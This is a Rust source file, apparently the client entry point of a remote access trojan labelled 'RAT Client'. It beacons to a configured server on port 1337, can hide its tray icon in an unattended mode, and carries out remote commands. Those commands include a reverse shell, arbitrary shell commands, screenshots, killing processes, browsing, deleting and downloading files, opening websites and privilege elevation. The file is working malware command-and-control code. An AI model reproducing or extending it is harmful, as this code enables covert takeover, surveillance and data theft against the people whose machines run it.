#[no_mangle]
#[link_section = ".zzz"]
static CONFIG: [u8; 1024] = [0; 1024];

use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;
use std::sync::{ Arc, Mutex };
use std::thread::sleep;

pub mod features;
pub mod handler;
pub mod service;

use handler::handle_command;
use common::{ buffers::read_buffer, ClientConfig };
use rand::{ rngs::OsRng, Rng };
use rsa::pkcs8::DecodePublicKey;
use rsa::Pkcs1v15Encrypt;
use std::process;

use crate::features::tray_icon::TrayIcon;
use common::commands::{ Command, EncryptionResponseData };
use common::buffers::write_buffer;

use rand::SeedableRng;
use rand_chacha::ChaCha20Rng;

use rsa::RsaPublicKey;
use once_cell::sync::Lazy;

static MUTEX_LOCK: Lazy<Mutex<service::mutex::MutexLock>> = Lazy::new(||
    Mutex::new(service::mutex::MutexLock::new())
);
static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy::new(||
    Mutex::new(features::reverse_shell::ReverseShell::new())
);

fn handle_server(
    mut read_stream: TcpStream,
    mut write_stream: TcpStream,
    is_connected: Arc<Mutex<bool>>
) {
    let mut current_path = PathBuf::new();

    let mut secret = [0u8; common::SECRET_LEN];
    OsRng.fill(&mut secret);

    let mut secret_initalized = false;

    loop {
        let secret_clone = Some(secret.to_vec());
        let received_command = read_buffer(&mut read_stream, if secret_initalized {
            &secret_clone
        } else {
            &None
        });

        match received_command {
            Ok(command) => {
                let mut handler_name: &str = "";
                let mut command_data_storage = String::new();
                let mut command_data: &str = "";

                let mut path_storage = String::new();
                let mut path = "";
                println!("Received command: {:?}", command);
                match command {
                    Command::EncryptionRequest(data) => {
                        let padding = Pkcs1v15Encrypt::default();
                        let public_key = RsaPublicKey::from_public_key_der(
                            &data.public_key
                        ).unwrap();

                        let encryption_response = EncryptionResponseData {
                            secret: public_key
                                .encrypt(&mut ChaCha20Rng::from_seed(secret), padding, &secret)
                                .unwrap(),
                        };

                        secret_initalized = true;

                        write_buffer(
                            &mut write_stream,
                            Command::EncryptionResponse(encryption_response),
                            &None
                        );
                    }
                    Command::InitClient => {
                        handler_name = "INIT_CLIENT";
                    }
                    Command::Reconnect => {
                        *is_connected.lock().unwrap() = false;
                        break;
                    }
                    Command::Disconnect => {
                        println!("should disconnect!");
                        let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
                        reverse_shell_lock.exit_shell();
                        process::exit(1);
                    }
                    Command::GetProcessList => {
                        handler_name = "PROCESS_LIST";
                    }
                    Command::KillProcess(data) => {
                        handler_name = "KILL_PROCESS";
                        command_data_storage = data.pid.to_string();
                        command_data = &command_data_storage;
                    }
                    Command::StartShell => {
                        handler_name = "START_SHELL";
                    }
                    Command::ExitShell => {
                        handler_name = "EXIT_SHELL";
                    }
                    Command::ShellCommand(data) => {
                        handler_name = "SHELL_COMMAND";
                        command_data_storage = data;
                        command_data = &command_data_storage;
                    }
                    Command::ScreenshotDisplay(data) => {
                        handler_name = "SCREENSHOT";
                        command_data_storage = data.to_string();
                        command_data = &command_data_storage;
                    }
                    Command::ManageSystem(data) => {
                        handler_name = "MANAGE_SYSTEM";
                        command_data_storage = data.to_string();
                        command_data = &command_data_storage;
                    }
                    Command::AvailableDisks => {
                        handler_name = "FILE_MANAGER";
                        command_data = "AVAILABLE_DISKS";
                    }
                    Command::PreviousDir => {
                        handler_name = "FILE_MANAGER";
                        command_data = "PREVIOUS_DIR";
                    }
                    Command::ViewDir(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "VIEW_DIR";
                        path_storage = data;
                        path = &path_storage;
                    }
                    Command::RemoveDir(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "REMOVE_DIR";
                        path_storage = data;
                        path = &path_storage;
                    }
                    Command::RemoveFile(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "REMOVE_FILE";
                        path_storage = data;
                        path = &path_storage;
                    }
                    Command::DownloadFile(data) => {
                        handler_name = "FILE_MANAGER";
                        command_data = "DOWNLOAD_FILE";
                        path_storage = data;
                        path = &path_storage;
                    }
                    Command::VisitWebsite(data) => {
                        handler_name = "VISIT_WEBSITE";
                        command_data_storage = data.visit_type;
                        command_data = &command_data_storage;
                        path_storage = data.url;
                        path = &path_storage;
                    }
                    Command::ElevateClient => {
                        handler_name = "ELEVATE_CLIENT";
                    }
                    _ => {
                        println!("Received an unknown or unhandled command.");
                    }
                }
                if handler_name.is_empty() {
                    println!("Received an unknown or unhandled command.");
                } else {
                    handle_command(
                        &mut write_stream,
                        handler_name,
                        command_data,
                        path,
                        &mut current_path,
                        &Some(secret.to_vec())
                    );
                }
            }
            Err(_) => {
                println!("Disconnected!");
                let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
                reverse_shell_lock.exit_shell();
                *is_connected.lock().unwrap() = false;
                break;
            }
        }
    }
}

fn main() {
    let mut config: ClientConfig = ClientConfig {
        ip: "".to_string(),
        port: "1337".to_string(),
        mutex_enabled: true,
        mutex: "TEST123".to_string(),
        unattended_mode: false,
        startup: false,
    };

    let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(
        std::io::Cursor::new(&CONFIG)
    );

    if let Some(config_link_sec) = config_link_sec.as_ref().ok() {
        config = config_link_sec.clone();
    }

    if config.mutex_enabled {
        let mut mutex_lock_guard = MUTEX_LOCK.lock().unwrap();
        mutex_lock_guard.init(config.mutex_enabled, config.mutex.clone());
        mutex_lock_guard.lock();

        println!("Mutex locked!");
    }

    let is_connected = Arc::new(Mutex::new(false));

    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));

    if !config.unattended_mode {
        tray_icon.lock().unwrap().show();
    }

    loop {
        let config_clone = config.clone();
        let is_connected_clone = is_connected.clone();
        let tray_icon_clone = tray_icon.clone();
        if *is_connected_clone.lock().unwrap() {
            if !config.unattended_mode {
                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
            }
            sleep(std::time::Duration::from_secs(5));
            continue;
        } else {
            if !config.unattended_mode {
                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
            }
        }

        std::thread::spawn(move || {
            println!("Connecting to server...");
            let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
            if let Ok(str) = stream {
                *is_connected_clone.lock().unwrap() = true;
                handle_server(
                    str.try_clone().unwrap(),
                    str.try_clone().unwrap(),
                    is_connected_clone
                );
            }
        });
        sleep(std::time::Duration::from_secs(5));
    }
}
